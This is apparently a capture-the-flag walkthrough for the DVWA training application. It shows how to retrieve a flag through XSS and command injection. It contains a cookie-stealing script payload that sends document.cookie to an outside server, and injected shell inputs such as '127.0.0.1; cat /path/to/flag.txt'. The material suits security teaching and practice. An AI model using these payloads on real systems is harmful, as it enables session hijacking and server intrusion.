# 13. Exploit web-app

### Exploiting Vulnerabilities to Retrieve the Flag  

**Approach 1: Exploiting XSS to Retrieve the Flag**  
Cross-Site Scripting (XSS) vulnerabilities can be exploited if a page on DVWA reflects user input without proper sanitization. Follow these steps to leverage XSS:  

#### Step 1: Log in to DVWA  
- Log in using your credentials.  
- Navigate to DVWA and set the security level to "Low" under the **DVWA Security** settings.  

#### Step 2: Navigate to an XSS Vulnerable Page  
- Go to **XSS (Stored)** or **XSS (Reflected)** from the DVWA sidebar.  

#### Step 3: Inject an XSS Payload  
**For XSS (Reflected)**:  
- In the input field (often labeled “Name”), enter an XSS payload to send data back to your server. Example:  
  ```html
  <script>fetch("http://your-server.com/log?data=" + document.cookie);</script>
  ```  
- This payload captures the user’s cookies and sends them to an external server you control.  

**For XSS (Stored)**:  
- Insert a similar payload into the message/comment field:  
  ```html
  <script>fetch("http://your-server.com/log?data=" + document.cookie);</script>
  ```  
- The payload will be stored and triggered whenever the page is loaded, allowing you to capture cookies from visiting users.  

#### Step 4: Access the Flag Page as an Admin  
- Use the stolen cookies to hijack an admin session.  
- Navigate to `page_id=108`. If the flag is restricted to admin users, this approach will grant access.  

---

**Approach 2: Exploiting Command Injection**  
If the DVWA setup includes a Command Injection vulnerability, you can directly extract sensitive information from the server.  

#### Step 1: Navigate to the Command Injection Page  
- Go to **Command Injection** from the sidebar menu.  
- This page usually includes a field for entering an IP address to test connectivity.  

#### Step 2: Test for Command Injection Vulnerability  
- Enter a test payload to verify vulnerability. Example:  
  ```
  127.0.0.1; ls
  ```  
- If successful, the output of the `ls` command (listing files in the directory) will be displayed, confirming the vulnerability.  

#### Step 3: Attempt to Access the Flag  
- Look for files with names suggesting sensitive content, such as `flag.txt`.  
- Use the following command to view the file's contents:  
  ```
  127.0.0.1; cat /path/to/flag.txt
  ```  
- Replace `/path/to/flag.txt` with the actual path revealed by the `ls` command.  

#### Step 4: Retrieve the Flag  
- If the file exists, the `cat` command will display its contents, allowing you to record the flag.  

---

### Summary  
1. **XSS Approach**: Inject malicious JavaScript on an XSS page to hijack the admin session and access `page_id=108`.  
2. **Command Injection Approach**: Exploit command injection to list server files and extract the flag using `cat`.  

These approaches highlight critical vulnerabilities and demonstrate the importance of proper input validation and sanitization in securing web applications.
